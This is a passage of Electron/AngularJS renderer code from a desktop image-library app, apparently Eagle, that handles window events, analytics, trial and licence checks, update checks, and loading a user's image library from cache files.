            ipcRenderer.on('update-preferences', function() {
                preferences = electronSettings.getSync('preferences');
                $rootScope.preferences = preferences;
                pluginModule.initShortcuts();
                pluginModule.initMenu();
                $rootScope.initMenu();
                $scope.updateSidebarList();
                $scope.vibrancyEnabled = preferences?.general?.enableVibrancy !== 'false';
                $scope.$evalAsync();
            });

            // var windowResizeTimeout;
            var $body = $("body");
            var windowResizeTimeout;
            $(window).on('resize', function(event) {
                if (!$scope.libraryPath) return;
                if (!$scope.isItemBindCalculated) return;

                clearTimeout(windowResizeTimeout);
                windowResizeTimeout = setTimeout(function () {
                    // $body.removeClass("window-resizing");
                    if ($scope.boxContianerWidth === $("#box-container").width()) {
                        return;
                    }
                    $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
                    $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;

                    $scope.updateSubFolderWidth();
                    $scope.updateSliderPosition();
                    $scope.updateContainerHieght(false, 1);
                    // $scope.offsetScrollbar(30);
                    setTimeout(function () {
                        if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                            if (ig && ig._layout) {
                                var currentColumn = ig._layout._columnLength;
                                var currentWidth = $scope.imageSize.height;
                                var targetColumn = Math.floor($scope.boxContianerWidth / currentWidth);
                                $scope.adjustLayoutWidth(targetColumn - currentColumn); 
                            }
                        }
                        autoScroll();
                    }, 50);
                    setTimeout(function () {
                        $scope.showImages();
                    }, 500);
                    $("#box-container-scrollbar").trigger("UPDATE_BOX_SCROLLBAR");
                    if ($scope.isDetailMode && $scope.lastZoomMode === "edge") {
                        $scope.zoomFitEdge(event);
                    }

                    if ($scope.layout !== "GridLayout" || $scope.layout !== "SquareLayout") { 
                        $scope.relayout();
                    }
                    $scope.showImages();
                    $scope.checkListItemsLessThanContainer();
                    $scope.lastItemStates = {};
                    $scope.$evalAsync();
                    setTimeout(() => {
                        $scope.relayout();
                    }, 100);
                }, 33);
            });

            ipcRenderer.on('window.maximize', function() {
                // setTimeout(function () {
                //     showImages();
                // }, 300);
                setTimeout(function () {
                    $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
                    $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;
                    if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                        if (ig && ig._layout) {
                            var currentColumn = ig._layout._columnLength;
                            var currentWidth = $scope.imageSize.height;
                            var targetColumn = Math.floor($scope.boxContianerWidth / currentWidth);
                            $scope.adjustLayoutWidth(targetColumn - currentColumn); 
                        }
                    }
                }, 200);
                $scope.isMaximize = true;
                $scope.lastItemStates = {};
                $scope.$evalAsync();
            });

            ipcRenderer.on('window.unmaximize', function() {
                // setTimeout(function () {
                //     showImages();
                // }, 300);
                setTimeout(function () {
                    $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
                    $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;
                    if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                        if (ig && ig._layout) {
                            var currentColumn = ig._layout._columnLength;
                            var currentWidth = $scope.imageSize.height;
                            var targetColumn = Math.floor($scope.boxContianerWidth / currentWidth);
                            $scope.adjustLayoutWidth(targetColumn - currentColumn); 
                        }
                    }
                }, 200);
                $scope.isMaximize = false;
                $scope.lastItemStates = {};
                $scope.$evalAsync();
            });

            $scope.AnalyticsHelper = {
                getCommonMertics: function () {
                    if ($bodyScope) {
                        return {
                            'all': $bodyScope.all.length,
                            'folders': $bodyScope.folderList.length,
                            'smartFolders': $bodyScope.smartFolders.length,
                            'tags': $bodyScope.tags.length,
                            'tagGroups': $bodyScope.TagManager.groups.length
                        }
                    }
                    else {
                        return false;
                    }
                }
            };

            ipcRenderer.on('analytics.event', function(e, data) {
                if (analytics) {
                    analytics.event(data.category, data.action, data.label, data.value || undefined);
                }
            });

            ipcRenderer.on('analytics.performance', function(e, data) {
                if (data.name && data.time) {
                    analytics.timing("performance", data.name, data.time);
                }
            });

            ipcRenderer.on('analytics.custom', function(e, data) {
                if (data) {
                    analytics.custom(data);
                }
            });

            ipcRenderer.on('analytics.exception', throttle(function(e, message) {
                // 暂时保留 GA 纪录错误讯息使用
                analytics.exception(message);
            }, 1000));

            ipcRenderer.on('log', function(e, data) {
                console.log(data);
            });

            ipcRenderer.on('confirm-import-eaglepack', function(e, params) {

                if ($("#extract-eaglepack-progress").hasClass("open")) return;

                var eaglepackPath = params.path;
                var sizeStr = params.sizeStr;

                try {
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon info"></div>
                                <h4 class="alert-title">${i18n.__("Dialog.Import.Eaglepack.Message")}</h4>
                                <p class="alert-desc">${i18n.__('Dialog.Import.Eaglepack.Detail.1') + sizeStr + i18n.__('Dialog.Import.Eaglepack.Detail.2')}</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("Dialog.Import.Eaglepack.Button.Import"),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function () {
                        IPCHelper.send('extrack-eaglepack', params);
                    });
                }
                catch (err) {};
            });

            ipcRenderer.on('reload', function(e, data) {
                stopAPIServer();
                location.reload();
                $bodyScope.SavedFilter.unwatch();
                Actions.unwatch();
            });

            ipcRenderer.on('show-intel-compatibility-issue', function(e, data) {
                dialog.showMessageBox(currentWindow, {
                    type: "none",
                    cancelId: 0,
                    buttons: [i18n.__("general.cancel"), i18n.__("dialog.rosetta.download")],
                    defaultId: 1,
                    message: i18n.__("dialog.rosetta.title"),
                    detail: i18n.__("dialog.rosetta.desc")
                }).then((result) => {
                    if (result.response === 1) {
                        shell.openExternal("https://eagle.cool/download/");
                    }
                });
            });

            // 软件退出警告窗口，当下载任务或修改图片任务仍在进行时，显示提示
            ipcRenderer.on('before-quit', function(e, data) {
                var showAlert = $scope.uploadQueue.length > 0 || $scope.downloadQueueLength > 0 || $scope.metadataQueueLength > 0 || $scope.isCleaningTrash || $scope.isImporting || $(".progress-dialog.open").not(".library-loading-dialog").length > 0 || $("#saving-progress-bar.open").length > 0;
                if (showAlert) {
                    swal({
                        title: $filter('i18n')('Dialog.BeforeQuit.Title'),
                        html: $filter('i18n')("Dialog.BeforeQuit.Descript"),
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        confirmButtonColor: "#F23459", // 1373FB DA4945
                        cancelButtonColor: "#777777",
                        confirmButtonText: $filter('i18n')("Dialog.BeforeQuit.Quit"),
                        cancelButtonText: $filter('i18n')("general.cancel"),
                        icon: "success"
                    }).then(function () {
                        stopAPIServer && stopAPIServer();
                        $bodyScope.SavedFilter.unwatch();
                        Actions.unwatch();
                        ipcRenderer.send("quit-app");
                        if (currentWindow && !currentWindow.isDestroyed()) {
                            currentWindow.hide();
                        }
                    });
                }
                else {
                    stopAPIServer && stopAPIServer();
                    $bodyScope.SavedFilter.unwatch();
                    Actions.unwatch();
                    ipcRenderer.send("quit-app");
                    if (currentWindow && !currentWindow.isDestroyed()) {
                        currentWindow.hide();
                    }
                }
            });

            ipcRenderer.on('app-status-welcome', function(e, params) {
                $scope.$evalAsync(function() {
                    $scope.libraryPath = "";
                    $scope.isLoading = false;
                    $rootScope.initMenu();
                });
            });

            ipcRenderer.on('update-progress', function(e, progress) {
                $scope.$evalAsync(function() {
                    $scope.progress = progress;
                });
            });

            ipcRenderer.on('add-download-task', function() {
                $scope.$evalAsync(function() {
                    $scope.uploadQueue.push({});
                });
            });

            ipcRenderer.on('add-download-tasks', function(event, count) {
                $scope.$evalAsync(function() {
                	for (var i = 0; i < count; i++) {
                		$scope.uploadQueue.push({});
                	}
                });
            });

            ipcRenderer.on('extension-server-init-failed', function(e, total) {
                $scope.localhostError = true;
                $scope.$evalAsync();
            });

            ipcRenderer.on('initial', function(e, params) {
            	$scope.trialRemain = params.trialRemain;
            	Registration = params.Registration;
            	$scope.Registration = Registration;
            	machineID = params.machineID;

                if (Registration && Registration.machineID !== machineID) {
                    setTimeout(() => {
                        electronLog.info(params.errorMsg);
                    }, Math.floor(Math.random() * 200000));
                }
                if (machineID == "") {
                    setTimeout(() => {
                        electronLog.info(params.errorMsg);
                    }, Math.floor(Math.random() * 200000));
                }
            	
            	console.log(params);
            	if (Registration && Registration.activated) { 
                    ga4track.setUserProperty('paid_user', 'yes');
            		customDimesion1 = "已激活";
            		$("body").css({
	            		"pointer-events": "",
	            		"opacity": ""
	            	});
            	}
        		else { 
        			customDimesion1 = "未激活";
                    ga4track.setUserProperty('paid_user', 'no');
        			$timeout(() => {
        				if ($scope.trialRemain && $scope.trialRemain > 0 && $scope.trialRemain < 30) {
                            const popupDays = [1, 3, 7, 14, 21, 28];
                            if (popupDays.indexOf($scope.trialRemain) > -1) {
                                var lastOpenTrialModalTime = localStorage["lastOpenTrialModalTime"] || undefined;
                                var now = Date.now();
                                var HALF_DAY = 1000 * 60 * 60 * 12;
                                if (!lastOpenTrialModalTime) {
                                    lastOpenTrialModalTime = now;
                                    localStorage["lastOpenTrialModalTime"] = now;
                                    $scope.openTrialModal($scope.trialRemain);
                                }
                                else {
                                    lastOpenTrialModalTime = parseInt(lastOpenTrialModalTime);
                                    if (now - lastOpenTrialModalTime < HALF_DAY) {
                                        console.log("12小时内暂时不再跳出");
                                        return;
                                    }
                                    $scope.openTrialModal($scope.trialRemain);
                                    localStorage["lastOpenTrialModalTime"] = now;
                                }
                            }
		            	}
        			}, 1000);
        		}
            	$rootScope.initMenu();
            	$scope.$evalAsync();
            });
            
            ipcRenderer.on('app-status-loading', function(e) {
                ig && ig.clear();
                $scope.isUILoaded = false;
                $scope.isItemBindCalculated = false;
                $rootScope.$broadcast("CLOSE-TAGS-POPUP");
                $scope.allData = [];
                $scope.isLoading = false;
                $scope.startCursor = 0;
                if (ScrollbarSaver) { ScrollbarSaver.positionMapping = {}; }
                $scope.$evalAsync();

                clearInterval(heartbeatInterval);
                ipcRenderer.removeAllListeners('background-state');
                $bodyScope.SavedFilter.unwatch();
                Actions.unwatch();
                stopAPIServer();
                console.log("移除 background-state 监听");

                fse = require('fs-extra');
                tinyPinyin = require(appRoot + '/my_modules/tiny-pinyin');
                pinyinlite = require(appRoot + '/my_modules/pinyinlite');
                readChunk = require('read-chunk');
                writeFileAtomic = require('write-file-atomic');
                cartesianProduct = require(appRoot + '/my_modules/cartesian-product');
                sanitize = require(appRoot + '/my_modules/sanitize-filename');
                unicodeNormalize = require('normalize-strings');
                chineseConvert = require(appRoot + '/my_modules/chinese_convert');
                colorConvert = require('color-convert');
                DeltaE = require('delta-e');
            });

            ipcRenderer.on('app-status-library-dirs-loaded', function(e, count) {
                $scope.isLoading = true;
                $scope.$evalAsync();
            });

            ipcRenderer.on('app-status-library-cache-loaded', function(e) {
                $scope.isLoading = true;
                $scope.$evalAsync();
            });

            function getMemory() {
                function toMb(bytes) {
                    return (bytes / (1000.0 * 1000)).toFixed(2)
                }
                var imageUsage = webFrame.getResourceUsage().images;
                console.log("workingSetSize: ", toMb(process.getProcessMemoryInfo().workingSetSize) + "MB");
                console.log("image count: ", imageUsage.count);
                console.log("image liveSize: ", toMb(imageUsage.liveSize) + "MB");
                console.log('------')
            }

            function digestDurationTest() {
                var interval = setInterval(function interval() {
                    angular.element(document).injector().invoke(function($rootScope) { 
                      var a = performance.now(); 
                      $rootScope.$apply(); 
                      console.log(`$digest duration: ${performance.now()-a}`); 
                    })
                    // var t1 = Date.now();
                    // $scope.$apply();
                    // var digestDuration = (Date.now() - t1);
                    // console.info(`$digest duration: ${digestDuration} ms.`);
                }, 1000);
            }

            let libraryCache = [];
            ipcRenderer.on('preload-library', function (e, params) {

                libraryCache = [];
                let cachePath = params.cachePath;

                if (!fs.existsSync(cachePath)) return;

                const lineByLine = require(appRoot + '/my_modules/n-readlines');
                console.time("preload-library");

                const liner = new lineByLine(cachePath, {
                    readChunk: 32768
                });

                let concatDakuten = function (str) {
                    if (!str.replace) return;
                    var table1 = ['が','ぎ','ぐ','げ','ご','ざ','じ','ず','ぜ','ぞ','だ','ぢ','づ','で','ど','ば','び','ぶ','べ','ぼ','ヴ','ガ','ギ','グ','ゲ','ゴ','ザ','ジ','ズ','ゼ','ゾ','ダ','ヂ','ヅ','デ','ド','バ','ビ','ブ','ベ','ボ','ぱ','ぴ','ぷ','ぺ','ぽ','パ','ピ','プ','ペ','ポ'];
                    var table2 = ['が','ぎ','ぐ','げ','ご','ざ','じ','ず','ぜ','ぞ','だ','ぢ','づ','で','ど','ば','び','ぶ','べ','ぼ','ヴ','ガ','ギ','グ','ゲ','ゴ','ザ','ジ','ズ','ゼ','ゾ','ダ','ヂ','ヅ','デ','ド','バ','ビ','ブ','ベ','ボ','は','ひ','ぷ','ぺ','ぽ','パ','ピ','プ','ペ','ポ'];
                    var i = 0, ii = table1.length;
                    for(; i < ii; i++){
                        str = str.replace(new RegExp(table1[i], 'g'), table2[i]);
                    }
                    return str;
                }

                let regex = /\u304B|\u3099|\u304D|\u304F|\u3051|\u3053|\u3055|\u3057|\u3059|\u305B|\u305D|\u305F|\u3061|\u3064|\u3066|\u3068|\u306F|\u3072|\u3075|\u3078|\u307B|\u30A6|\u30AB|\u30AD|\u30AF|\u30B1|\u30B3|\u30B5|\u3099|\u30B7|\u3099|\u30B9|\u3099|\u30BB|\u3099|\u30BD|\u3099|\u30BF|\u3099|\u30C1|\u3099|\u30C4|\u3099|\u30C6|\u3099|\u30C8|\u3099|\u30CF|\u3099|\u30D2|\u3099|\u30D5|\u3099|\u30D8|\u3099|\u30DB|\u3099|\u306F|\u309A|\u3072|\u309A|\u3075|\u309A|\u3078|\u309A|\u307B|\u309A|\u30CF|\u309A|\u30D2|\u309A|\u30D5|\u309A|\u30D8|\u309A|\u30DB|\u309A/g;
                let line;
                let lines = [];
                while (line = liner.next()) {
                    lines.push(line);
                }
                for (let i = lines.length - 1; i >= 0; i--) {
                    let line = lines[i];
                    try {
                        let image = JSON.parse(line);
                        if (image.id) {
                            libraryCache.push(image);
                        }
                    }
                    catch (e) {
                        try {
                            // 如果偵測到 metadata.json 字串尾端出現異常字串導致無法正常讀取問題時，將自動嘗試修復
                            if (e?.message && e?.message.indexOf(" position ") > -1) {
                                let position = e.message.split(" position ")[1];
                                if (position) {
                                    position = parseInt(position);
                                    if (position > 0) {
                                        let newJSONStr = line.toString().substr(0, position);
                                        try {
                                            let fixedObj = JSON.parse(newJSONStr);
                                            if (fixedObj.id) {
                                                libraryCache.push(fixedObj);
                                            }
                                        }
                                        catch (err) {}
                                    }
                                }
                            }
                        }
                        catch (err) {}
                    }
                }
                console.timeEnd("preload-library");
            });

            console.time("load-library");
            ipcRenderer.on('app-status-library-loaded', async function(e, params) {

                if (currentWindow.getTitle() !== 'E' + 'a' + 'g' + 'l' + 'e') {
                    ipcRenderer.send('quit');
                }

				if (!ig) {
					ig = new eg.InfiniteGrid("#box-container .box-list", {
						isOverflowScroll: false,
						threshold: 2000
					});
				}
                ig && ig.clear();

            	machineID = params.machineID;

            	if (params.backgroundWindowID) {
            		backgroundWindowID = params.backgroundWindowID;
            	}

                console.timeEnd("load-library");
                if (PERFORMANCE_MONITOR.watchDigest) {
                    digestDurationTest();
                }

                if (PERFORMANCE_MONITOR.watchMemoryUsage) {
                    setInterval(getMemory, 2000);
                }
                
                // console.timeEnd("后台载入资源库所费时间");
                // console.time("前台收到后台资料后，初始化时间");
                if (!$scope.isUILoaded) {
                    $scope.isUILoaded = true;
                }

                if (process.platform == 'darwin') {
                    window.setTimeout(function() { remote.app.dock.bounce("informational") }, 1000);
                } else {
                    window.setTimeout(function() {
                        if (!document.hasFocus()) {
                            currentWindow.flashFrame(true)
                        }
                    }, 1000);
                }

                var usingCache = params.usingCache;
                $scope.usingCache = usingCache;
                dragging = false;
                $scope.winMenu = [];
                $scope.all = [];
                $scope.shuffle = [];
                $scope.trash = [];
                $scope.untaggedCount = 0;
                $scope.unfiledCount = 0;
                $scope.tags = [];
                $scope.selectedTags = {};
                $scope.selectingTags = {};
                allTags = {};
                $scope.lockedImages = {};
                $scope.itemMappings = {};
                $scope.lastItemStates = {};
                $scope.isCropMode = false;
                $scope.startCursor = 0;
                eagle.filter.filterExtensions = {};
                eagle.filter.filterCameras = [];
                if (ScrollbarSaver) { ScrollbarSaver.positionMapping = {}; }

                $scope.duplicateMappings = {};
                $scope.images = [];
                $scope.selected = [];
                $scope.current = undefined;
                $scope.selectedMappings = {};
                $scope.folderMappings = {};
                $scope.currentFolder = undefined;
                $scope.currentSmartFolder = undefined;
                $scope.smartFolderMappings = {};
                $scope.uploadQueue = [];
                $scope.finishQueue = [];
                $scope.isDetailMode = false;
                $scope.isInlineMode = false;
                $scope.isGrayscaleMode = false;
                $scope.usingGifPlayer = false;
                $scope.showDetailImage = false;
                $scope.currentTagGroup = undefined;
                $scope.tagViewMode = "ALL";
                $scope.folderKeyword = "";
                eagle.filter.filterRules.color.gray = false;
                hardDiskSpeed = undefined;
                remainShowImageCount = 0;
                $scope.showSlowNotify = false;
                SlowNotify.hasShow = false;
                SlowNotify.slowCount = 0;
                SlowNotify.fastCount = 0;

                var path = require('path');
                $scope.libraryName = path.basename(params.rootDir).replace('.library', '');
                $scope.libraryPath = path.normalize(params.rootDir);

                if (process.platform == 'darwin') {
                    $scope.rootDir = encodeURI(params.rootDir);
                    $scope.imagesDir = encodeURI(params.imagesDir);
                } else {
                    $scope.rootDir = encodeURI(params.rootDir.replace(/\\/g, "/"));
                    $scope.imagesDir = encodeURI(params.imagesDir.replace(/\\/g, "/"));
                }
                $scope.libraryImagesPath = params.imagesDir;

                $rootScope.imagesDir = $scope.imagesDir;
                $rootScope.fontFolder = fontFolder;

                $scope.orderBy = localStorage.getItem(`eagle.list.orderBy.${$scope.rootDir}`) || localStorage.getItem("eagle.list.orderBy") || "IMPORT";
                var userLayout = localStorage.getItem(`eagle.list.layout.${$scope.rootDir}`) || localStorage.getItem("eagle.list.layout") || "JustifiedLayout";

                if (localStorage.getItem(`eagle.list.sortIncrease.${$scope.rootDir}`)) {
                    $scope.sortIncrease = localStorage.getItem(`eagle.list.sortIncrease.${$scope.rootDir}`) === 'true';
                }

                var userLayoutOptions = localStorage.getItem("eagle.list.layout.options") || "Fit";
                $scope.layoutOptions = userLayoutOptions;
                $scope.switchLayout(userLayout);

                RecentFileManager.init($scope.libraryName);
                $scope.TagManager.init(params.rootDir);
                $scope.SavedFilter.init(params.rootDir);
                $scope.Actions = Actions;
                Actions.init({
                    rootDir: params.rootDir,
                    logger: electronLog,
                    callback: function () {},
                    onChange: function () {
                        $rootScope.initMenu();
                    }
                });

                $scope.folders = params.folders;
                $scope.libraryModificationTime = params.modificationTime;


                // 自动补上 children
                eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {

                    if (!folder.children) {
                        folder.children = [];
                    }

                    if (folder && parent) {
                        folder.parent = parent.id;
                    }

                    // 从 localStorage 取得 expand 状态，如果没有预设为 false
                    folder.isExpand = localStorage.getItem("eagle.sidebar.folder.expand." + folder.id) === "true";
                    if (!folder.children || folder.children.length === 0) {
                        folder.isExpand = true;
                    }

                    folder.images = [];
                    $scope.folderMappings[folder.id] = folder;
                });

                $scope.smartFolders = params.smartFolders || [];
                eagle.utils.tree.walk($scope.smartFolders, 'children', function (smartFolder, parent, depth) {

                	if (!smartFolder.children) {
                        smartFolder.children = [];
                    }

                    if (!smartFolder.conditions) {
		                smartFolder.conditions = [];
		            }

                    smartFolder.isExpand = localStorage.getItem("eagle.sidebar.smartFolder.expand." + smartFolder.id) === "true";
                	
                	if (smartFolder && parent) {
                        smartFolder.parent = parent.id;
                    }

                    $scope.smartFolderMappings[smartFolder.id] = smartFolder;

                });

                $scope.quickAccess = params.quickAccess || [];
                TagManager.groups = params.tagsGroups || [];
                // Note: 过去版本如果使用者曾经使用批量添加，标签会多了一个 \r 符号
                TagManager.groups.forEach(function (group) {
                    if (group && group.tags) {
                        for (var i = 0; i < group.tags.length; i++) {
                            try {
                                group.tags[i] = group.tags[i].replace(/\r?\n?/g, '');
                            }
                            catch (err) {}
                        }
                    }
                });

                $scope.updateSidebarList();
                $rootScope.initMenu();

                // NOTE: 只能用迂迴的方式處理可能超過 10W 張圖片的狀況，避免使用 JSON.parse 造成大量數據無法傳輸的問題
                // console.time("[Cache Time] 序列图片");
                electronLog.info(`[app] Load Library: ${$scope.rootDir}`);

                var images = [];
                if (params.usingPreloadCache && libraryCache.length > 0) {
                    console.time("从緩存载入图片");
                    images = libraryCache;
                    console.timeEnd("从緩存载入图片");
                }
                else {
                    const lineByLine = require(appRoot + '/my_modules/n-readlines');
                    console.time("从文件载入图片");

                    const liner = new lineByLine(params.imagesStringPath, {
                        readChunk: 32768
                    });

                    let line;
                    while (line = liner.next()) {
                        try {
                            var image = JSON.parse(line);
                            if (image.id) {
                                images.push(image);
                            }
                        }
                        catch (e) {
                            try {
                                // 如果偵測到 metadata.json 字串尾端出現異常字串導致無法正常讀取問題時，將自動嘗試修復
                                if (e?.message && e?.message.indexOf(" position ") > -1) {
                                    let position = e.message.split(" position ")[1];
                                    if (position) {
                                        position = parseInt(position);
                                        if (position > 0) {
                                            let newJSONStr = line.toString().substr(0, position);
                                            try {
                                                let fixedObj = JSON.parse(newJSONStr);
                                                if (fixedObj.id) {
                                                    images.push(fixedObj);
                                                }
                                            }
                                            catch (err) {}
                                        }
                                    }
                                }
                            }
                            catch (err) {}
                        }
                    }

                    console.timeEnd("从文件载入图片");
                }

                // 確保所有數據包含 .tags .folders
                images.forEach((item) => {
                    if (!item.tags) item.tags = [];
                    if (!item.folders) item.folders = [];
                });

                $scope.raw = images;

                $scope.calculateImageBinding({}, function() {
                    $scope.viewMode = localStorage.getItem(`eagle.viewMode.${$scope.rootDir}`) || "all";
                    $scope.isItemBindCalculated = true;
                    if ($scope.viewMode == "all") {
                        var lastFolderId = localStorage.getItem(`eagle.lastFolder.${$scope.rootDir}`);
                        var lastItem = $scope.itemMappings[localStorage.getItem(`eagle.lastViewItem.${$scope.rootDir}`)];
                        var lastItemTime = localStorage.getItem(`eagle.lastViewItemTime.${$scope.rootDir}`);
                        var lastFolder = $scope.folderMappings[lastFolderId]
                        var lastSmartFolder = $scope.smartFolderMappings[lastFolderId];

                        if (lastFolder && !lastFolder?.password) {
                            $scope.openFolder(lastFolder);
                            $scope.changeSidebarIndex(lastFolder); 
                            if (lastFolder.orderBy !== "RANDOM") {
                                setTimeout(function () { 
                                    var DAY_7 = 604800000;
                                    if ( (lastItemTime && Date.now() - parseInt(lastItemTime) < DAY_7) &&
                                        (lastItem && lastItem.folders && isInFolder(lastItem, lastFolder)) &&
                                        !$scope.lockedImages[lastItem.id]
                                    ) {
                                        $scope.selected = [lastItem];
                                        $scope.scrollToSelectedItem()
                                        clearTimeout(showImagesTimeout2);
                                        $scope.$evalAsync(); 
                                    }
                                }, 100);
                            }
                        }
                        else if (lastSmartFolder) {
                            $scope.openSmartFolder(lastSmartFolder);
                            if (lastSmartFolder.orderBy !== "RANDOM") {
                                setTimeout(function () { 
                                    var DAY_7 = 604800000;
                                    if ( 
                                        (lastItemTime && Date.now() - parseInt(lastItemTime) < DAY_7) &&
                                        $scope.existInSmartFilter(lastSmartFolder, lastItem)
                                    ) {
                                        $scope.selected = [lastItem];
                                        $scope.scrollToSelectedItem()
                                        clearTimeout(showImagesTimeout2);
                                        $scope.$evalAsync(); 
                                    }
                                }, 100);
                            }
                        }
                        else {
                            $scope.openAll(undefined, function() {
                                setTimeout(function () { 
                                    var DAY_7 = 604800000;
                                    if ( (lastItemTime && Date.now() - parseInt(lastItemTime) < DAY_7) && lastItem && !$scope.lockedImages[lastItem.id] ) {
                                        $scope.selected = [lastItem];
                                        $scope.scrollToSelectedItem()
                                        clearTimeout(showImagesTimeout2);
                                        $scope.$evalAsync(); 
                                    }
                                }, 100);
                            });
                        }
                    } else if ($scope.viewMode == "unfiled") {
                        $scope.openUnfiled()
                    } else if ($scope.viewMode == "untagged") {
                        $scope.openUntagged()
                    } else if ($scope.viewMode == "random") {
                        $scope.openRandom()
                    } else if ($scope.viewMode == "recent") {
                        $scope.openRecent()
                    } else if ($scope.viewMode == "community") {
                        $scope.openCommunity()
                    } else if ($scope.viewMode == "alltags") {
                        $scope.openAllTags()
                    } else if ($scope.viewMode == "trash") {
                        $scope.openTrash()
                    }
                    else {
                        $scope.openAll();
                    }

                    $scope.isLoading = false;
                    $scope.libraryLoadedProgress = 0;
                	$scope.updateSidebarList();

                    var loadedTime = params.loadedTime;
                    var performanceName = "Cache-Load";

                    if (usingCache) { performanceName = "Cache-Load"; }
                    else { performanceName = "Library-Load"; }

                    analytics.timing("performance", performanceName, loadedTime * 1000);

                    // 记录用户收藏数据
                    // 记录用户打开资源库性能
                    // Note: 注意，整個 app 只能呼叫一次 pageview，因為我們目前使用 pageview 次數做為平均資源數計算的分母
                    var metrics = $scope.AnalyticsHelper.getCommonMertics();
                    if (metrics) {
                        analytics.custom({
                            't': 'pageview',
                            'dl': '/',
                            'cm1': metrics.all,
                            'cm2': metrics.folders,
                            'cm3': metrics.smartFolders,
                            'cm4': metrics.tags,
                            'cm5': metrics.tagGroups
                        });
                        // 更新用户最后使用状态
                        if (machineID) {
                            var email;
                            if (Registration && Registration.license && Registration.license.email) {
                            	email = Registration.license.email;
                            }
                            $http.post("https://cn.eagle.cool/update-machine", {
                                machineID: machineID,
                                email: email,
                                'all': metrics.all,
                                'folders': metrics.folders,
                                'smartFolders': metrics.smartFolders,
                                'tags': metrics.tags,
                                'tagGroups': metrics.tagGroups
                            }, (result) => {});
                        }
                    }
                });

                setTimeout(function () {
                    // 建立重复核对表
                    $scope.findDupclipate(undefined);
                    if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                    	$scope.adjustLayoutWidth(0); 
                    }
                    // else {
                    // 	$scope.relayout();
                    // }
                    $scope.updateSidebarList();

                    ayncsUpdateSmartFoldersCount($scope.smartFolderList, () => {});

                    setTimeout(function () { $scope.updateContainerHieght(); }, 300);
                    $scope.$evalAsync();

                }, 1000);

                if (eagle.filter.isOpen) {
                    setTimeout(function () { $scope.updateContainerHieght(); }, 300);
                }

                $scope.navigationHistory = [];
                $scope.navigationHistoryIndex = 0;
                
                var $savingProgressbar = $("#saving-progress-bar");
                var $savingProgressbarMessage = $("#saving-progress-bar .message");


				if (!APIServer) {
					initAPIServer(); 
				}
                startAPIServer();

                console.log("开始 background-state 监听");
                ipcRenderer.on('background-state', function (e, state) {

                    clearInterval(heartbeatInterval);
                    heartbeatStopCount = 0;
                    heartbeatInterval = setInterval(checkBackgroundHeartbeat, 10000);

                    // 仅呼吸，不提供数据，避免 UI 更新
                    if (!state) {
                        return;
                    }

                    var number = 0;
                    var savingNumber = 0;
                    if (state && angular.isNumber(state.paletteQueueLength)) {
                        number += state.paletteQueueLength;
                        $scope.paletteQueueLength = state.paletteQueueLength;
                    }
                    if (state && angular.isNumber(state.metadataQueueLength)) {
                        savingNumber += state.metadataQueueLength;
                        $scope.metadataQueueLength = state.metadataQueueLength;
                    }
                    if (state && angular.isNumber(state.downloadQueueLength)) {
                        $scope.downloadQueueLength = state.downloadQueueLength;
                    }

                    // 需要判断什么时候在更新画面，什么时候不需要
                    $scope.paletteQueueDelay = state.paletteQueueDelay;
                    $scope.currentProcessCount = number;
                    $scope.lastProcessCount;

                    // if ($scope.lastProcessCount === undefined || $scope.currentProcessCount !== $scope.currentProcessCount) {

                        requestAnimationFrame(() => {

                            if (state.metadataQueueLength > 3) {
                                var savingLabel = $filter('i18n')("progress.savingFiles.msg", [
                                    { "property": "count", "value": $filter('number', 0)(savingNumber) }
                                ]);
                                $savingProgressbarMessage.text(savingLabel);
                                $savingProgressbar.addClass("open");
                            }
                            else {
                                $savingProgressbar.removeClass("open");
                            }

                            var $backgroundStateComponent = $("#background-state-spinner");
                            var $backgroundStateSpinnerIcon = $("#background-state-spinner .pause-icon");
                            var $backgroundStateSpinner = $("#background-state-spinner .sm-spiner");
                            if ($scope.currentProcessCount > 0) {
                                $backgroundStateComponent.show();
                            }
                            else {
                                $backgroundStateComponent.hide();
                            }
                            $scope.paletteQueuePaused = state.paletteQueuePaused;
                            if (!$scope.paletteQueuePaused) {
                                $backgroundStateSpinner.addClass("has-animation");
                                $backgroundStateSpinnerIcon.show();
                            }
                            else {
                                $backgroundStateSpinner.removeClass("has-animation");
                                $backgroundStateSpinnerIcon.hide();
                            }
                            
                            $scope.lastProcessCount = $scope.currentProcessCount;
                        });
                    // }
                });

                var SIX_HOUR = 1000 * 60 * 60 * 6;
                IPCHelper.send("check-for-update", {
                	machineID: machineID,
                });

                clearInterval(updateTimer);
                updateTimer = setInterval(function() {
                    IPCHelper.send("check-for-update", {
                    	machineID: machineID
                    });
                }, SIX_HOUR);

                console.timeEnd("前台总耗时");

                $scope.errorList = [];

                // 检查 localhost 是否可以连线，如果无法练接，通常是本地代理搞鬼，提示用户关闭或调整代理工具
                $.ajax({
                    url: "http://localhost:41593"
                }).done(function(res) {
                    electronLog.info(`[app] Local server: enabled`);
                    electronLog.info("---------------------------------------");
                }).fail(function() {
                    if ($scope.localhostError !== true) {
                        $scope.localhostError = true;
                        $scope.$evalAsync();
                    }
                    electronLog.error(`[app] Local server: disabled`);
                    electronLog.error("---------------------------------------");
                });

                if (!ACCESS.checkALCs($bodyScope.libraryPath)) {
                    ipcRenderer.send('electron-log', "[app] Detect library has no write permission, path: " + $bodyScope.libraryPath);
                    if ($scope.libraryPathPermissionError !== true) {
                        $scope.libraryPathPermissionError = true;
                    }
                }
                else {
